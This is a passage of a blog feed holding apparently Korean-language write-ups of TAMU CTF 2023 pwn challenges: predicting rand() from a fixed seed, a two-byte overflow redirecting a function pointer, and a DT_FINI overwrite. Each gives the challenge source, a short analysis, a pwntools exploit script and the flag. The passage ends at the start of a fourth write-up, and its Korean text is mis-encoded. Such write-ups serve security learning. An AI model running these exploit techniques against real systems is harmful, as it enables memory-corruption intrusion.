class="string">&quot;r&quot;</span>);</span><br><span class="line">        fread(flag, <span class="number">1</span>, <span class="keyword">sizeof</span>(flag), f);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Nice work, here&#x27;s the flag: %s\n&quot;</span>, flag);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;How unlucky :pensive:&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>pieê°€ ê±¸ë ¤ìžˆëŠ”ë° <code>main</code>ì„ ì¶œë ¥í•´ì¤€ë‹¤. ì´ê²ƒìœ¼ë¡œ <code>pie base</code>ë¥¼ êµ¬í•  ìˆ˜ ìžˆë‹¤.</p><p><code>rand()</code>ë¥¼ ì˜ˆì¸¡í•˜ë©´ <code>flag</code>ë¥¼ íšë“í•  ìˆ˜ ìžˆë‹¤. ì—¬ê¸°ì„œ ì·¨ì•½ì ì€ <code>seed</code>ê°€ ê³ ì •ë˜ì–´ ìžˆì–´ì„œ <code>rand()</code>ë¥¼ ì˜ˆì¸¡í•  ìˆ˜ ìžˆë‹¤. ì´ë¥¼ ìœ„í•´ cíŒŒì¼ì„ í•˜ë‚˜ ë§Œë“¤ì–´ì„œ ì˜ˆì¸¡í•œ <code>rand()</code> ê°’ì„ ë°›ì•„ì™€ì„œ ìž…ë ¥ìœ¼ë¡œ ë„£ì–´ì£¼ë©´ ë  ë“¯ í•˜ë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p><code>rand()</code>ë¥¼ ì˜ˆì¸¡í•˜ê¸° ìœ„í•´ ì•„ëž˜ì™€ ê°™ì€ cíŒŒì¼ì„ ë§Œë“¤ì–´ì„œ ì»´íŒŒì¼í•œë‹¤. ìš°ë¦¬ëŠ” ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì˜ seedê°’ ì£¼ì†Œë¥¼ êµ¬ì†Œí•´ì„œ ì¸ìžë¡œ ë„˜ê²¨ì£¼ê³  <code>srand()</code> í•¨ìˆ˜ ì¸ìžë¡œ ì‚¬ìš©í•´ì•¼ í•œë‹¤. ê·¸ë¦¬ê³  ë¬¸ì œ ë°”ì´ë„ˆë¦¬ì—ì„œ <code>rand()</code> ê°’ì„ 7ë²ˆ ë§žì¶”ëŠ” ê²ƒì„ ìš”êµ¬í–ˆê¸° ë•Œë¬¸ì— ì´ê²ƒì„ ê·¸ëŒ€ë¡œ cë¡œ êµ¬í˜„í•´ì¤€ë‹¤. ìžŠì§€ë§ì•„ì•¼í•  ê²ƒì€ íŒŒì´ì¬ ìŠ¤í¬ë¦½íŠ¸ì—ì„œ ë°©ê¸ˆ ë§Œë“  ë°”ì´ë„ˆë¦¬ì˜ ì¶œë ¥ê°’ì„ ë°›ì•„ì™€ì•¼í•œë‹¤ëŠ” ì‚¬ì‹¤ì´ë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// gcc 1.c</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv[])</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// printf(&quot;%d\n&quot;, atoi(argv[1]));</span></span><br><span class="line">srand(atoi(argv[<span class="number">1</span>]));</span><br><span class="line"><span class="type">int</span> random = rand();</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random1 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random1);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random2 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random2);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random3 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random3);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random4 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random4);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random5 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random5);</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> random6 = rand();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, random6);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;unlucky&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./unlucky&#x27;)</span></span><br><span class="line">e = ELF(<span class="string">&#x27;./unlucky&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvline(), <span class="number">16</span>) - <span class="number">0x11a5</span></span><br><span class="line"></span><br><span class="line">seed = e.address + <span class="number">0x4068</span></span><br><span class="line"><span class="built_in">print</span>(seed)</span><br><span class="line">random = subprocess.check_output([<span class="string">&#x27;./a.out&#x27;</span>, <span class="built_in">str</span>(seed)]).strip().split(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">random = [<span class="built_in">int</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> random]</span><br><span class="line"><span class="built_in">print</span>(random)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">0</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">1</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">2</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">3</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">4</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">5</span>]))</span><br><span class="line">p.sendline(<span class="built_in">str</span>(random[<span class="number">6</span>]))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;1_n33d_b3tt3r_3ntr0py_s0urc3s&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rand </tag>
            
            <tag> seed </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Pointers (pwn, 2bytes overflow)</title>
      <link href="/230503-tamu2023-3.Pointers-pwn/"/>
      <url>/230503-tamu2023-3.Pointers-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>Iâ€™ve been messing with pointers lately which never goes wrong, right?<br>Author: anomie</p></blockquote><ul><li>[90 solves &#x2F; 421 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë°”ì´ë„ˆë¦¬ì™€ ì†ŒìŠ¤ì½”ë“œë¥¼ ì œê³µí•´ì¤€ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">upkeep</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// Not related to the challenge, just some stuff so the remote works correctly</span></span><br><span class="line">    setvbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">    setvbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>, _IONBF, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/cat&quot;</span>, <span class="string">&quot;flag.txt&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">lose</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/echo&quot;</span>, <span class="string">&quot;loser&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">010</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Interaction pls: &quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">10</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    upkeep();</span><br><span class="line">    <span class="type">void</span>* func_ptrs[] = &#123;lose, win&#125;;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;All my functions are being stored at %p\n&quot;</span>, func_ptrs);</span><br><span class="line">    </span><br><span class="line">    vuln();</span><br><span class="line">    </span><br><span class="line">    <span class="type">void</span> (*poggers)() = func_ptrs[<span class="number">0</span>];</span><br><span class="line">    poggers();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>vuln</code> í•¨ìˆ˜ë¥¼ IDAë¡œ ì‚´íŽ´ë³´ë©´ ì•„ëž˜ì™€ ê°™ë‹¤. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">8</span>]; <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Interaction pls: &quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>2byte overflowê°€ ë°œìƒí•œë‹¤. í›„ì— <code>void (*poggers)() = func_ptrs[0];</code> ì„ í†µí•´ <code>lose</code> í•¨ìˆ˜ê°€ í˜¸ì¶œëœë‹¤. ì´ ëŒ€ì‹  <code>vuln</code> í•¨ìˆ˜ì˜ overflowë¥¼ í†µí•´ <code>win</code> í•¨ìˆ˜ê°€ í˜¸ì¶œë˜ëŠ” ê²ƒì´ ëª©í‘œì´ë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><p>ì²˜ìŒì— ì¶œë ¥í•´ì£¼ëŠ” í•¨ìˆ˜ í¬ì¸í„° ì£¼ì†Œë¥¼ <code>0x7ffebafcc630</code>ë¼ê³  í•˜ìž. ì´ëŠ” <code>lose</code> í•¨ìˆ˜ ì£¼ì†Œê°€ ì €ìž¥ë˜ì–´ìžˆê³  +8í•œ <code>0x7ffebafcc638</code>ì—ëŠ” <code>win</code> í•¨ìˆ˜ ì£¼ì†Œê°€ ì €ìž¥ë˜ì–´ìžˆë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â†’ 0x5589074ca2c4 &lt;main+74&gt;        mov    rax, QWORD PTR [rbp-0x20]</span><br><span class="line">  0x5589074ca2c8 &lt;main+78&gt;        mov    QWORD PTR [rbp-0x8], rax</span><br><span class="line">  0x5589074ca2cc &lt;main+82&gt;        mov    rdx, QWORD PTR [rbp-0x8]</span><br><span class="line">  0x5589074ca2d0 &lt;main+86&gt;        mov    eax, 0x0</span><br><span class="line">  0x5589074ca2d5 &lt;main+91&gt;        call   rdx</span><br></pre></td></tr></table></figure><p><code>rbp-0x20</code> ì£¼ì†Œì— ì €ìž¥ëœ ê°’ì„ <code>rax</code>ì— ë„£ëŠ”ë‹¤. ì´ ê°’ì´ ì „ë‹¬ë˜ì–´ <code>rdx</code>ì— ë“¤ì–´ê°€ê³  ê²°êµ­ <code>call rdx</code>ë¥¼ ì‹¤í–‰í•œë‹¤. ê²°êµ­ <code>rbp</code>ì—ëŠ” <code>0x7ffebafcc638 + 0x20</code> ê°’ì´ ë“¤ì–´ê°€ì•¼ í•œë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;pointers&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./pointers&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;at &#x27;</span>)</span><br><span class="line">func_ptrs = p.recvline()[:-<span class="number">1</span>]</span><br><span class="line"><span class="built_in">print</span>(func_ptrs)</span><br><span class="line"></span><br><span class="line">win = func_ptrs[-<span class="number">4</span>:]</span><br><span class="line"><span class="built_in">print</span>(win)</span><br><span class="line">win = <span class="built_in">int</span>(win, <span class="number">16</span>) + <span class="number">8</span> + <span class="number">0x20</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(win))</span><br><span class="line"></span><br><span class="line"><span class="comment"># real_win = int(func_ptrs, 16) + 8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * <span class="number">8</span></span><br><span class="line">payload += p16(win)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;small_overflows_are_still_effective&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> rbp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Randomness (pwn, fini)</title>
      <link href="/230503-tamu2023-4.Randomness-pwn/"/>
      <url>/230503-tamu2023-4.Randomness-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I made this program to test how srand and rand work, but it keeps segfaulting. I donâ€™t read compiler warnings so I canâ€™t figure out why itâ€™s broken.<br>Author: anomie</p></blockquote><ul><li>[86 solves &#x2F; 428 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë°”ì´ë„ˆë¦¬ì™€ ì†ŒìŠ¤ì½”ë“œë¥¼ ì œê³µí•´ì¤€ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">win</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">char</span>* argv[] = &#123;<span class="string">&quot;/bin/cat&quot;</span>, <span class="string">&quot;flag.txt&quot;</span>, <span class="literal">NULL</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">foo</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> seed;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter a seed:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, &amp;seed);</span><br><span class="line">    srand(seed);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">bar</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> a;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter your guess:&quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%lu&quot;</span>, a);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (rand() == a) &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;correct!&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;incorrect!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;hello!&quot;</span>);</span><br><span class="line">    foo();</span><br><span class="line">    bar();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;goodbye!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ì‚¬ì‹¤ ì½”ë“œë§Œ ë³´ê³  ì·¨ì•½ì ì„ ë°”ë¡œ ëª»ì°¾ì•˜ë‹¤. ê·¸ëž˜ì„œ ë””ë²„ê¹…í•˜ë©´ì„œ í„°ì§€ëŠ” ë¶€ë¶„ì„ ì°¾ì•„ë´¤ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mov    QWORD PTR [rax], rdx</span><br></pre></td></tr></table></figure><p>ìœ„ ì¸ìŠ¤íŠ¸ëŸ­ì…˜ì—ì„œ í„°ì¡Œê³ , ì € ê°’ë“¤ì€ ë‚˜ì˜ ìž…ë ¥ê°’ì´ì—ˆë‹¤. ì´ê²ƒì„ ë°”íƒ•ìœ¼ë¡œ ì–´ë””ì— <code>win</code> í•¨ìˆ˜ ì£¼ì†Œë¥¼ ì“¸ ì§€ ê³ ë¯¼í–ˆë‹¤.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    No RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p><code>NO RELRO</code>ì´ë‹¤.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">LOAD:0000000000403248                 Elf64_Dyn &lt;0Dh, 4012D4h&gt; ; DT_FINI</span><br></pre></td></tr></table></figure><p>í”„ë¡œê·¸ëž¨ì´ ì¢…ë£Œë  ë•Œ í˜¸ì¶œë˜ëŠ”ë° ì—¬ê¸°ì— ë®ìœ¼ë©´ ëœë‹¤.</p><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;tamuctf.com&quot;</span>, <span class="number">443</span>, ssl=<span class="literal">True</span>, sni=<span class="string">&quot;randomness&quot;</span>)</span><br><span class="line"><span class="comment"># p = process(&#x27;./randomness&#x27;)</span></span><br><span class="line"><span class="comment"># e = ELF(&#x27;./randomness&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;seed:&#x27;</span>, <span class="string">&#x27;4207176&#x27;</span>)<span class="comment">#  0x403248</span></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;guess:&#x27;</span>, <span class="string">&#x27;4198867&#x27;</span>) <span class="comment">#&#x27;0x4011D3&#x27;)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gigem&#123;value_or_pointer_is_an_important_distinction&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
          <category> Tamu </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fini </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tamu CTF 2023 - Encryptinator (pwn, oob read)</title>
      <link href="/230503-tamu2023-7.Encryptinator-pwn/"/>
      <url>/230503-tamu2023-7.Encryptinator-pwn/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1914">https://ctftime.org/event/1914</a></li></ul><blockquote><p>I have made this super secure encryption engine. Iâ€™ll encrypt any message and no one will ever be able to read it. Not even me!<br>Author: <code>_mac_</code></p></blockquote><ul><li>[31 solves &#x2F; 491 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><p>ë°”ì´ë„ˆë¦¬ì™€ ì†ŒìŠ¤ì½”ë“œë¥¼ ì œê³µí•´ì¤€ë‹¤. libcë„ ì œê³µí•´ì¤¬ë‹¤.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span 